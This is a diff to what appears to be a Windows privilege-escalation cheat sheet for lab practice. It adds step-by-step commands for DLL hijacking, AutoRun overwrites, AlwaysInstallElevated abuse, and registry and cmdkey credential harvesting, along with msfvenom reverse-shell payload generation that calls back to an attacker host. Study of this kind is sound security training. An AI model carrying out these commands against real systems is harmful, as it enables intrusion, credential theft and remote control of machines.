@@ -679,18 +679,10 @@ python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
 #### Service Exploits
 
 ```bash
-# Query the configuration of a service:
-sc.exe qc {NAME}
+# Enumeration
+.\winPEASany.exe quiet servicesinfo
 
-# Query the current status of a service:
-sc.exe query {NAME}
 
-# Modify a configuration option of a service:
-sc.exe config {NAME} {OPTION}= {VALUE}
-
-Start/Stop a service:
-net start {NAME}
-net stop {NAME}
 
 # 1. Insecure Service Properties
 
@@ -776,18 +768,110 @@ net start filepermsvc
 # Query the service
 sc qc dllsvc
 
+# Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the Filter menu
+
+# Add a new filter on the Process Name matching dllhijackservice.exe
+
+# On the main screen, deselect registry activity and network activity
+
+# Start the service
+net start dllsvc
+
+# Back in Procmon, note that a number of “NAME NOT FOUND” errors appear, associated with the hijackme.dll file.
+
+# At some point, Windows tries to find the file in the C:\Temp directory, which as we found earlier, is writable by our user.
+
+# Generate Reverse Shell payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP ADDRESS} LPORT={PORT} -f dll -o hijackme.dll
+
+# Copy the DLL to the Windows VM and into the C:\Temp directory. Start a listener on Kali and then stop/start the service to trigger the exploit:
+net stop dllsvc
+net start dllsvc
+```
+
+</br>
+
+#### Registry Exploits
+
+```bash
+
+# 1. AutoRuns
+
+# Requires computer restart for priv esc.
+
+# Enumeration Commands
+.\winPEASany.exe quiet applicationsinfo
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+# Use accesschk.exe to verify the permissions on each one
+.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+
+# Copy our reverse shell executable to overwrite the AutoRun executable:
+copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
 
 
 
+# 2. AlwaysInstallElevated
+
+
+# Enumeration  to see if both registry values are set
+.\winPEASany.exe quiet windowscreds
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP ADDRESS} LPORT={PORT} -f msi -o reverse.msi
+
+# Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit
+msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 
 ```
 
+</br>
+
+#### Credential Access
+
+```bash
+
+# 1. Credentials from registry 
+
+
+# Using Winpeas
+.\winPEASany.exe quiet filesinfo userinfo
+
+# Manual search (Local Machine and Current User)
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+# Manual query for confirmation
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+# On Kali, we can use the winexe command to spawn a shell using these credentials
+winexe -U '{USER}%{PASSWORD}' //{IP ADDRESS} cmd.exe
 
 
 
+2. Credentials from cmdkey
 
 
+# Using Winpeas
+.\winPEASany.exe quiet cmd windowscreds
 
+# We can verify this manually using the following command:
+cmdkey /list
+
+# If the saved credentials aren’t present, run the following script to refresh the credential:
+C:\PrivEsc\savecred.bat
+
+# We can use the saved credential to run any command as the admin user
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+
+3. Credentials from configuration files
+
+
+```
 
 
 ```bash
